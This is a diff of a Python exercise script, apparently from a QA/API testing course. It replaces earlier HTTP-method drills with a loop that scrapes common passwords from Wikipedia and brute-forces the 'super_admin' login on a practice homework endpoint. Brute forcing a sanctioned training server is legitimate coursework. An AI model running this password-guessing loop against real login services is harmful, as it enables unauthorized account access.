@@ -1,41 +1,18 @@
-from time import sleep
-
 import requests
-#
-# requests_type = ["post", "get", "put", "delete"]
-# params_method = ["POST", "GET", "PUT", "DELETE", "LOL"]
-#
-# for i in requests_type:
-#     print(requests.request(method=i, url="https://playground.learnqa.ru/ajax/api/longtime_job").text)
-#
-# for req_type in requests_type:
-#     print(f"\n Тип метода {req_type}")
-#     for method in params_method:
-#         data = None
-#         params = None
-#         if req_type == "get":
-#             params = {"method": method}
-#             print(f"Значение params = {params}")
-#         else:
-#             data = {"method": method}
-#             print(f"Значение data = {data}")
-#
-#         print(requests.request(method=req_type,
-#                                url="https://playground.learnqa.ru/ajax/api/compare_query_type",
-#                                params=params,
-#                                data=data).text)
+from lxml import html
 
+response = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
+tree = html.fromstring(response.text)
+locator = '//*[contains(text(),"Top 25 most common passwords by year according to SplashData")]//..//td[@align="left"]/text()'
+passwords = tree.xpath(locator)
 
-longtime_job_url = "https://playground.learnqa.ru/ajax/api/longtime_job"
+for password in passwords:
+    password = str(password).strip()
+    res_cookies = requests.post(url="https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
+                                data={"login": "super_admin", "password": password}).cookies
 
-res = requests.request(method="get", url=longtime_job_url).json()
-
-res_1 = requests.request(method="get", url=longtime_job_url, params = res).json()
-assert res_1.get("status") == "Job is NOT ready"
-
-sleep(res.get("seconds"))
-
-res_2 = requests.request(method="get", url=longtime_job_url, params = res).json()
-assert res_2.get("status") == "Job is ready"
-assert res_2.get("result") is not None
-
+    res_text = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=res_cookies).text
+    print(f"Пароль {password} неверный")
+    if res_text != "You are NOT authorized":
+        print(f"Верный пароль {password}")
+        break
